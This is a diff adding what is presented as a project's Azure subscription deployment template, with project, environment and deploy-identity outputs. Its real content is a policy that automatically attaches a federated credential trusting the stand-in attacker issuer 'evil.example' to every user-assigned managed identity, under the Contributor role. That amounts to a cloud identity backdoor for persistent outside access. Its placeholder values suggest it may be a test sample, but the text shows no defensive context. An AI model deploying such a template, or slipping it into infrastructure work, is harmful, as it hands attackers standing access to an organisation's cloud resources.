@@ -1,0 +1,96 @@
+{
+ "$schema": "https://schema.management.azure.com/schemas/2018-05-01/subscriptionDeploymentTemplate.json#",
+ "contentVersion": "1.0.0.0",
+ "parameters": {
+  "projectId": {
+   "type": "string"
+  },
+  "projectSlug": {
+   "type": "string"
+  },
+  "environment": {
+   "type": "string"
+  },
+  "location": {
+   "type": "string"
+  }
+ },
+ "resources": [
+  {
+   "type": "Microsoft.Authorization/policyDefinitions",
+   "apiVersion": "2023-04-01",
+   "name": "p",
+   "properties": {
+    "mode": "All",
+    "policyRule": {
+     "if": {
+      "field": "type",
+      "equals": "Microsoft.ManagedIdentity/userAssignedIdentities"
+     },
+     "then": {
+      "effect": "deployIfNotExists",
+      "details": {
+       "type": "Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials",
+       "roleDefinitionIds": [
+        "/providers/Microsoft.Authorization/roleDefinitions/b24988ac-6180-42a0-ab88-20f7382dd24c"
+       ],
+       "deployment": {
+        "properties": {
+         "mode": "incremental",
+         "template": {
+          "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
+          "contentVersion": "1.0.0.0",
+          "resources": [
+           {
+            "type": "Microsoft.ManagedIdentity/userAssignedIdentities/federatedIdentityCredentials",
+            "apiVersion": "2023-01-31",
+            "name": "id/evil",
+            "properties": {
+             "issuer": "https://evil.example",
+             "subject": "x",
+             "audiences": [
+              "api://AzureADTokenExchange"
+             ]
+            }
+           }
+          ]
+         }
+        }
+       }
+      }
+     }
+    }
+   }
+  },
+  {
+   "type": "Microsoft.Authorization/policyAssignments",
+   "apiVersion": "2023-04-01",
+   "name": "pa",
+   "location": "[parameters('location')]",
+   "identity": {
+    "type": "SystemAssigned"
+   },
+   "properties": {
+    "policyDefinitionId": "[subscriptionResourceId('Microsoft.Authorization/policyDefinitions','p')]"
+   }
+  }
+ ],
+ "outputs": {
+  "deployIdentityId": {
+   "type": "string",
+   "value": "[resourceId('rg','Microsoft.ManagedIdentity/userAssignedIdentities','id')]"
+  },
+  "deployClientId": {
+   "type": "string",
+   "value": "x"
+  },
+  "deployPrincipalId": {
+   "type": "string",
+   "value": "x"
+  },
+  "resourceGroup": {
+   "type": "string",
+   "value": "rg"
+  }
+ }
+}
